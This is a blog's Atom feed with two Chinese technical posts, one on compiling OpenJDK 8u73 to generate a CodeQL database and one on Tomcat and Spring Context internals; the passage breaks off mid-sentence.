<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>fynch3r的小窝</title>
  
  <subtitle>Trust the process.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://fynch3r.github.io/"/>
  <updated>2022-03-03T04:04:42.547Z</updated>
  <id>https://fynch3r.github.io/</id>
  
  <author>
    <name>fynch3r</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记一次CodeQL与OpenJDK的联动</title>
    <link href="https://fynch3r.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1CodeQL%E4%B8%8EOpenJDK%E7%9A%84%E8%81%94%E5%8A%A8/"/>
    <id>https://fynch3r.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1CodeQL%E4%B8%8EOpenJDK%E7%9A%84%E8%81%94%E5%8A%A8/</id>
    <published>2022-03-03T02:00:18.000Z</published>
    <updated>2022-03-03T04:04:42.547Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>夜来风雨声，花落知多少。</p></blockquote><p>使用CodeQL为OpenJDK生成数据库，过程中踩了很多坑，写篇博客详细记录一下。</p><a id="more"></a><h1 id="CodeQL数据库生成流程"><a href="#CodeQL数据库生成流程" class="headerlink" title="CodeQL数据库生成流程"></a>CodeQL数据库生成流程</h1><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1CodeQL%E4%B8%8EOpenJDK%E7%9A%84%E8%81%94%E5%8A%A8/image-20220303101229869.png" alt="image-20220303101229869" style="zoom:50%;"><p>CodeQL引擎内的<code>Extractor</code>会对程序中的语义信息进行分析与提取，用来构建后续用来分析的数据库。</p><p>编译型语言：在本地编译的过程中，可以将<code>Extractor</code>视作探针。它监视编译过程，捕获程序语义信息。</p><p>解释性语言：直接分析程序源码。</p><p>数据库里有什么：源代码<code>src.zip</code>、语义信息、关系数据。</p><h1 id="CodeQL数据库获取途径"><a href="#CodeQL数据库获取途径" class="headerlink" title="CodeQL数据库获取途径"></a>CodeQL数据库获取途径</h1><p><a href="https://lgtm.com/" target="_blank" rel="noopener">LGTM平台</a>对CodeQL做了非常好的数据支持，不仅可以在上面直接编写QL脚本查询，还可以下载到特定组件对应的数据库。</p><p>当然，LGTM也支持与用户的GitHub仓库联动的Workflow，具体操作看参考<a href="https://lgtm.com/help/lgtm/github-apps-integration" target="_blank" rel="noopener">官方文档</a>。</p><p>但痛点是，LGTM平台并没有OpenJDK的Database。。。</p><p>为了解决它，我去<a href="https://github.com/openjdk/jdk8u" target="_blank" rel="noopener">openjdk/jdk8u</a>项目找到对应版本的tag，本地编译了一下，也就有了这篇博客。</p><h1 id="过程记录"><a href="#过程记录" class="headerlink" title="过程记录"></a>过程记录</h1><h2 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h2><p>操作系统：ubuntu 16.04</p><p>Boot_JDK：jdk 1.7.0_80</p><p>Target_OpenJDK:OpenJDK 8u73</p><h2 id="准备Boot-JDK"><a href="#准备Boot-JDK" class="headerlink" title="准备Boot_JDK"></a>准备Boot_JDK</h2><p>我选择的是直接解压<code>tar.gz</code>方式进行Boot_JDK的安装，<code>jdk-7u80-linux-x64.tar.gz</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line">mkdir /usr/lib/jvm</span><br><span class="line">tar -zxvf jdk-7u80-linux-x64.gz -C /usr/lib/jvm</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置环境变量</span></span><br><span class="line">vim ~/.bashrc</span><br><span class="line">export JAVA_HOME=/usr/lib/jvm/jdk1.7.0_80</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib  </span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br><span class="line"><span class="meta">#</span><span class="bash"> 环境变量生效</span></span><br><span class="line">source ～/.bashrc</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置系统默认的JDK版本</span></span><br><span class="line">update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.7.0_80/bin/java 300  </span><br><span class="line">update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk1.7.0_80/bin/javac 300  </span><br><span class="line">update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk1.7.0_80/bin/jar 300   </span><br><span class="line">update-alternatives --install /usr/bin/javah javah /usr/lib/jvm/jdk1.7.0_80/bin/javah 300   </span><br><span class="line">update-alternatives --install /usr/bin/javap javap /usr/lib/jvm/jdk1.7.0_80/bin/javap 300 </span><br><span class="line">update-alternatives --config java</span><br><span class="line"><span class="meta">#</span><span class="bash"> 检查是否配置成功</span></span><br><span class="line">java -version</span><br></pre></td></tr></table></figure><h2 id="准备Toolchain"><a href="#准备Toolchain" class="headerlink" title="准备Toolchain"></a>准备Toolchain</h2><p>软件包更新：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure><p>安装编译工具：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y build-essential gdb cmake cpio file unzip zip wget ccache</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y --no-install-recommends  libfontconfig1-dev libfreetype6-dev  libcups2-dev libx11-dev  libxext-dev  libxrender-dev  libxrandr-dev  libxtst-dev  libxt-dev libasound2-dev  libffi-dev  autoconf</span><br></pre></td></tr></table></figure><p>降级cmake到3.81版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd ~/OpenJDK8u73</span><br><span class="line">wget http://ftp.gnu.org/gnu/make/make-3.81.tar.gz </span><br><span class="line">  &amp;&amp; tar -zxvf make-3.81.tar.gz </span><br><span class="line">  &amp;&amp; cd make-3.81 </span><br><span class="line">  &amp;&amp; bash configure -prefix=/usr </span><br><span class="line">  &amp;&amp; make </span><br><span class="line">  &amp;&amp; make install</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看cmake版本</span></span><br><span class="line">cmake -v</span><br></pre></td></tr></table></figure><p>OpenJDK编译环境检查：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 configure</span><br><span class="line">./configure --with-target-bits=64 --with-boot-jdk=/usr/lib/jvm/jdk1.7.0_80 --with-debug-level=slowdebug --enable-debug-symbols ZIP_DEBUGINFO_FILES=0</span><br></pre></td></tr></table></figure><p>当你看到这个画面，恭喜你，你的编译环境没问题：</p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1CodeQL%E4%B8%8EOpenJDK%E7%9A%84%E8%81%94%E5%8A%A8/image-20220303105226017.png" alt="image-20220303105226017" style="zoom:50%;"><h2 id="编译-amp-数据库生成"><a href="#编译-amp-数据库生成" class="headerlink" title="编译&amp;数据库生成"></a>编译&amp;数据库生成</h2><p>到这里，下面这行命令就可以编译了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make all DISABLE_HOTSPOT_OS_VERSION_CHECK=OK ZIP_DEBUGINFO_FILES=0</span><br></pre></td></tr></table></figure><p>但我们想要的是CodeQL数据库，所以需要改一下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create Openjdk8u73_db --language="java" --command="make all DISABLE_HOTSPOT_OS_VERSION_CHECK=OK ZIP_DEBUGINFO_FILES=0"</span><br></pre></td></tr></table></figure><p>编译成功之后，cd到<code>build/linux-x86_64-normal-server-slowdebug/jdk/bin</code>目录下：</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1CodeQL%E4%B8%8EOpenJDK%E7%9A%84%E8%81%94%E5%8A%A8/image-20220303110254754.png" alt="image-20220303110254754"></p><p>编译好的OpenJDK在build目录下，对应的CodeQL数据库在源码目录下：</p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1CodeQL%E4%B8%8EOpenJDK%E7%9A%84%E8%81%94%E5%8A%A8/image-20220303105954416.png" alt="image-20220303105954416" style="zoom:50%;"><h2 id="CodeQL查询"><a href="#CodeQL查询" class="headerlink" title="CodeQL查询"></a>CodeQL查询</h2><p>有了Database，导入到VSCode插件中，写个脚本简单查询一下：</p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1CodeQL%E4%B8%8EOpenJDK%E7%9A%84%E8%81%94%E5%8A%A8/image-20220303111013521.png" alt="image-20220303111013521" style="zoom:50%;"><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><ol><li>MacOS上面Xcode，clang那一套编译工具实在是头大，为了省事，选择了Toolchain更简单清晰的Linux；</li><li>下载Linux版本的<a href="https://github.com/github/codeql-cli-binaries" target="_blank" rel="noopener">CodeQL CLI</a>以及<a href="https://github.com/github/codeql" target="_blank" rel="noopener">CodeQL Lib</a>,构建数据库之前，别忘了修改环境变量；</li><li>降级make是为了保证稳定编译；</li><li>Boot_JDK一定要选择比Target_JDK版本低的JDK；</li><li>目前闭源第三方Jar包依然是CodeQL痛点；</li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://mp.weixin.qq.com/s/ZMXEwCJCj_eXFkq8vw-JKA" target="_blank" rel="noopener">手把手教你搭建单步调试openjdk环境（值得收藏）</a></p><p><a href="https://blog.csdn.net/mole_exp/article/details/122330521" target="_blank" rel="noopener">编译OpenJDK8并生成CodeQL数据库</a></p><p><a href="https://github.com/openjdk/jdk8u" target="_blank" rel="noopener">openjdk/jdk8u</a></p><p><a href="http://hg.openjdk.java.net/jdk8/jdk8/raw-file/tip/README-builds.html" target="_blank" rel="noopener">官方Build OpenJDK</a></p><p><a href="https://github.com/fnmsd/OpenJDK8-BuildEnv-Docker" target="_blank" rel="noopener">fnmsd/OpenJDK8-BuildEnv-Docker</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;夜来风雨声，花落知多少。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用CodeQL为OpenJDK生成数据库，过程中踩了很多坑，写篇博客详细记录一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CodeQL" scheme="https://fynch3r.github.io/categories/CodeQL/"/>
    
    
      <category term="实战" scheme="https://fynch3r.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>Context琐事</title>
    <link href="https://fynch3r.github.io/Context%E7%90%90%E4%BA%8B/"/>
    <id>https://fynch3r.github.io/Context%E7%90%90%E4%BA%8B/</id>
    <published>2021-12-08T02:03:34.000Z</published>
    <updated>2021-12-08T12:04:07.786Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>去年花里逢君别，今年花开又一年。</p></blockquote><p>对JavaWeb中Context的学习，设计模式yyds。</p><a id="more"></a><h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><p>文中出现的所有名词解释：</p><p>​    Web容器：Tomcat，JBoss</p><h1 id="Tomcat架构"><a href="#Tomcat架构" class="headerlink" title="Tomcat架构"></a>Tomcat架构</h1><p>Tomcat大家都比较熟悉了，Connector连接器负责外部交流，Container容器负责内部处理。</p><p>Container组件，容器，内部实现了4种子容器：</p><p>4种子容器: <code>Engine、Host、Context、Wrapper</code> ，这四种容器是父子关系。</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208101735602.png" alt="image-20211208101735602" style="zoom:50%;"><ol><li>Engine: 最顶层容器组件，可以包含多个Host。实现类为<code>org.apache.catalina.core.StandardEngine</code></li><li>Host: 代表一个虚拟主机，每个虚拟主机和某个域名Domain Name相匹配，可以包含多个Context。实现类为<code>org.apache.catalina.core.StandardHost</code></li><li><strong>Context</strong>: 一个Context对应于一个Web 应用，可以包含多个Wrapper。<strong>实现类为<code>org.apache.catalina.core.StandardContext</code></strong></li><li>Wrapper: 一个Wrapper对应一个Servlet。负责管理 Servlet ，包括Servlet的装载、初始化、执行以及资源回收。实现类为<code>org.apache.catalina.core.StandardWrapper</code></li></ol><p><strong>Context在Tomcat中代表一个Web应用的抽象表示</strong>，下文重点看Context部分。</p><h1 id="三种Context"><a href="#三种Context" class="headerlink" title="三种Context"></a>三种Context</h1><ol><li><p>ServletContext</p></li><li><p>StandardContext</p></li><li><p>ApplicationContext</p></li></ol><h2 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h2><p><strong>ServletContext是javax.servlet包下的接口(规范)，它不属于Tomcat也不属于Spring家族</strong>。</p><p>它的本意是可以对某个Web应用的各种资源和功能进行访问。</p><p>Web容器在启动时，它会为每个Web应用程序都创建一个对应的ServletContext对象。<strong>它代表当前Web应用，并且它被所有客户端共享</strong>。</p><h2 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h2><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208103824206.png" alt="image-20211208103824206" style="zoom:50%;"><p>Tomcat架构图中的Context其实就是个接口，Tomcat内部对Context接口的默认实现为StandardContext类。</p><p><strong>StandardContext是一个Web应用在Tomcat内部的具体对象。</strong></p><h2 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h2><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208104906459.png" alt="image-20211208104906459" style="zoom:50%;"><p>ApplicationContext其实更像是为了满足ServletContext规范而对StandardContext的一种封装。</p><p>在Tomcat内部，ApplicationContext是ServletContext接口的具体实现。</p><p>而Tomcat惯用Facade方式，因此我们一般获取的ServletContext实例是ApplicationContextFacade对象</p><p>ApplicationContextFacade对象其实就是对ApplicationContext做了一层包装。</p><h1 id="搞搞StandardContext"><a href="#搞搞StandardContext" class="headerlink" title="搞搞StandardContext"></a>搞搞StandardContext</h1><h2 id="web-xml信息装配到StandardContext中"><a href="#web-xml信息装配到StandardContext中" class="headerlink" title="web.xml信息装配到StandardContext中"></a>web.xml信息装配到StandardContext中</h2><p>如果你debug过tomcat的源码，你会发现，其实在tomcat启动的时候，会执行valve责任链那一套，来到</p><p>Tomcat 层级调用组件的start()方法，执行StandardContext.startInternal() 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//挑重点说</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">startInternal</span><span class="params">()</span> <span class="keyword">throws</span> LifecycleException </span>&#123;</span><br><span class="line">  <span class="comment">// LifeCycle.java</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String CONFIGURE_START_EVENT = <span class="string">"configure_start"</span>;</span><br><span class="line">  <span class="comment">// Notify our interested LifecycleListeners</span></span><br><span class="line">  fireLifecycleEvent(Lifecycle.CONFIGURE_START_EVENT, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//LifecycleBase#fireLifecycleEvent</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">fireLifecycleEvent</span><span class="params">(String type, Object data)</span> </span>&#123;</span><br><span class="line">  LifecycleEvent event = <span class="keyword">new</span> LifecycleEvent(<span class="keyword">this</span>, type, data);</span><br><span class="line">  <span class="keyword">for</span> (LifecycleListener listener : lifecycleListeners) &#123;</span><br><span class="line">    listener.lifecycleEvent(event);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出来，在startInternal()方法中调用fireLifecycleEvent()发布一个”configure_start” 事件。</p><p>fireLifecycleEvent方法内部将信号configure_start被包装为一个LifecycleEvent对象event，通知所有的lifecycleListeners。</p><p>LifecycleListener是一个接口，接口中的lifecycleEvent抽象方法被ContextConfig实现类进行了重写。</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208110604926.png" alt="image-20211208110604926" style="zoom:50%;"><p>下面是ContextConfig类重写的lifecycleEvent方法，可以看到我们现在满足信号条件会执行configureStart方法。</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208110745925.png" alt="image-20211208110745925" style="zoom:50%;"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">configureStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  webConfig();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解析web.xml</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">webConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 解析web.xml</span></span><br><span class="line">  parseWebXml(InputSource source, WebXml dest, <span class="keyword">boolean</span> fragment)</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 将web.xml文件解析到的各个组件设置到标准servlet上下文StandardContext中去</span></span><br><span class="line">  configureContext(WebXml webxml)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态调试源码看一眼，确实是StandardContext对象</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208111356903.png" alt="image-20211208111356903" style="zoom:50%;"><p>configureContext方法内部其实就是为我们配置filter、listener、filter、filterMap等信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">configureContext</span><span class="params">(WebXml webxml)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//filter</span></span><br><span class="line">  <span class="keyword">for</span> (FilterDef filter : webxml.getFilters().values()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (filter.getAsyncSupported() == <span class="keyword">null</span>) &#123;</span><br><span class="line">      filter.setAsyncSupported(<span class="string">"false"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    context.addFilterDef(filter);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//filterMap</span></span><br><span class="line">  <span class="keyword">for</span> (FilterMap filterMap : webxml.getFilterMappings()) &#123;</span><br><span class="line">    context.addFilterMap(filterMap);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//把配置文件中sevrlet设置到context中</span></span><br><span class="line">  <span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">    Wrapper wrapper = context.createWrapper();</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//把配置文件中listener设置到context中</span></span><br><span class="line">  <span class="keyword">for</span> (String listener : webxml.getListeners()) &#123;</span><br><span class="line">    context.addApplicationListener(listener);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>configure_start信号目的就是让tomcat将web.xml信息加入到StandardContext中，现在已经结束了。</p><p>回到StandardContext.startInternal()方法中：</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208113227724.png" alt="image-20211208113227724" style="zoom:50%;"><h1 id="整合SpringMVC"><a href="#整合SpringMVC" class="headerlink" title="整合SpringMVC"></a>整合SpringMVC</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/app-context.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>app<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>app<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们发现，在springMVC的web.xml通常有这么一节配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!--监听器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着上一小节说，如果我们现在将SpringMVC工程打成war包，工程的web.xml就会被解析，这段listener就会被解析进来</p><p>我们进入listenerStart方法，顾名思义就是触发每个listener的方法：</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208114414880.png" alt="image-20211208114414880" style="zoom:50%;"><p>重点片段：</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208115857716.png" alt="image-20211208115857716" style="zoom:50%;"><p>debug看一下，确实触发ContextLoaderListener#contextInitialized方法，event包装的是ApplicationContextFacade</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208115335072.png" alt="image-20211208115335072" style="zoom:50%;"><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208115446263.png" alt="image-20211208115446263" style="zoom:50%;"><p>我们直接进入initWebApplicationContext方法</p><p>上来就是域对象属性判断：</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208120244813.png" alt="image-20211208120244813" style="zoom:50%;"><p>我们传进来的ApplicationContextFacade当然没有这个属性了</p><p>来到this.context = this.createWebApplicationContext(servletContext);</p><p>很明显，这是创建SpringMVC自己的WebApplicationContext</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208120622462.png" alt="image-20211208120622462" style="zoom:50%;"><h1 id="搞搞ApplicationContext"><a href="#搞搞ApplicationContext" class="headerlink" title="搞搞ApplicationContext"></a>搞搞ApplicationContext</h1><p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208131115677.png" alt="image-20211208131115677"></p><p>Spring有两个核心接口：BeanFactory和ApplicationContext。都可以代表Spring容器。</p><p>什么是Spring容器？Spring容器是生成Bean实例的工厂，并且管理容器中的Bean的生命周期。</p><p>应用中的所有组件，都处于Spring的管理下，都被Spring以Bean的方式管理，Spring负责创建Bean实例，并管理他们的生命周期。</p><p>和 BeanFactory 类似，它可以加载配置文件中定义的 bean，将所有的 bean 集中在一起，当有请求的时候分配 bean。 </p><p>另外，它增加了企业所需要的功能，比如，从属性文件从解析文本信息和将事件传递给所指定的listeners。</p><p>BeanFactory的实现是按需创建，即第一次获取Bean时才创建这个Bean，而ApplicationContext会一次性创建所有的Bean。</p><p>最常被使用的 ApplicationContext 接口实现：</p><ol><li>FileSystemXmlApplicationContext：该容器从 XML 文件中加载已被定义的 bean。需要提供XML 文件的<strong>完整路径</strong>。</li><li>ClassPathXmlApplicationContext：该容器从 XML 文件中加载已被定义的 bean。不需要提供 XML 文件的完整路径。</li><li>WebXmlApplicationContext：该容器会在一个 web 应用程序的范围内加载在 XML 文件中已被定义的 bean。</li></ol><h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h2><p>我们回到”创建SpringMVC自己的WebApplicationContext”这里：</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208120622462.png" alt="image-20211208120622462" style="zoom:50%;"><p>跟进去createWebApplicationContext方法中：</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208132051735.png" alt="image-20211208132051735" style="zoom:50%;"><p>determineContextClass方法：</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208132431548.png" alt="image-20211208132431548" style="zoom:50%;"><p>这里的ApplicationContextFacade没有contextClass属性(自己在web.xml可以配置)</p><p>那么ClassUtils.forName就为应用返回一个默认的XmlWebApplicationContext类型的Class对象。</p><p>返回上级createWebApplicationContext方法，返回值contextClass其实就是XmlWebApplicationContext类对象。</p><img src="../images/Context%E7%90%90%E4%BA%8B/image-20211208132634934.png" alt="image-20211208132634934"><p>进入BeanUtils.instantiateClass方法，将Class对象进行了实例化，返回了XmlWebApplicationContext的实例化对象，赋值给了ContextLoader类（ContextLoaderListener的父类）的context属性。</p><p>XmlWebApplicationContext是WebApplicationContext的某一个实现类</p><p>我们可以看到，其实这里的context已经被标识为”Root 